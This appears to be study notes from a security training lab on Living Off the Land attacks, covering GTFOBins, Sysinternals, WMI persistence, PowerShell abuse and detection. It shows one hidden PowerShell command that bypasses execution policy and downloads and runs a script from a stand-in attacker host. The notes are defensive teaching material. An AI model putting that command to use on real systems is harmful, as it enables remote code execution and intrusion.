# Living Off the Land Attacks

## Overview

This room explores Living Off the Land (LotL) attacks, a technique in which attackers abuse legitimate system tools and native utilities to perform malicious activities. Since these tools are already present in many environments, their use can make malicious activity harder to distinguish from normal administrative behavior.

## Learning Objectives

- Understand the concept of Living Off the Land attacks.
- Identify legitimate tools that can be abused by attackers.
- Learn how attackers use native Windows and Linux utilities.
- Understand techniques involving WMI, PowerShell, and remote process creation.
- Explore methods for detecting suspicious activity.

## Topics Covered

### GTFOBins and Sysinternals

GTFOBins is a resource that documents Unix and Linux binaries that can be misused to bypass security restrictions or perform unintended actions.

Sysinternals is a collection of Windows utilities used for system administration, troubleshooting, and security investigations. Tools such as PsExec and Autoruns can be useful to administrators but may also be abused by attackers.

### WMI Event Subscriptions

Windows Management Instrumentation (WMI) can be used to manage systems and automate administrative tasks. Attackers may abuse permanent WMI event subscriptions to establish persistence.

Relevant MITRE ATT&CK technique:

- T1546.003: Windows Management Instrumentation Event Subscription

### PowerShell and WMIC

PowerShell provides powerful scripting capabilities that can be abused to download and execute malicious content.

Example of a suspicious command pattern:

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object System.Net.WebClient).DownloadString('http://attacker.example/payload.ps1')"
```

Important elements include:

- `IEX`: Executes a PowerShell expression.
- `DownloadString`: Retrieves content from a specified URL as a string.
- `-W Hidden`: Runs the PowerShell process with a hidden window.
- `-Exec Bypass`: Attempts to bypass the PowerShell execution policy.

WMIC can also be abused to initiate processes on remote systems. The `process call create` syntax can be used to request process creation on a target host.

## Detection and Investigation

When investigating potential Living Off the Land activity, analysts should look for:

- PowerShell commands that download and execute remote content.
- Hidden PowerShell processes or unusual execution-policy arguments.
- Suspicious WMI activity and remote process creation.
- Unexpected use of administrative utilities.
- Unusual command-line arguments and network connections.
- Activity that differs from the normal behavior of the host or user.

A legitimate system utility is not inherently malicious. Detection requires examining the command, its context, the parent process, the user account, and related network activity.

## Key Takeaways

- Attackers can abuse legitimate operating system tools to reduce the need for external malware.
- PowerShell and WMI are useful administrative technologies that can also be misused.
- Sysinternals and GTFOBins help security professionals understand how native tools may be abused.
- Behavioral analysis and contextual investigation are essential for detecting LotL activity.

## Tools and Technologies

- PowerShell
- Windows Management Instrumentation (WMI)
- WMIC
- Sysinternals
- GTFOBins
- MITRE ATT&CK

## Conclusion

This room demonstrates why security analysts must understand both legitimate system administration and attacker behavior. Recognizing suspicious use of native utilities is an important skill for threat hunting, incident response, and blue team operations.
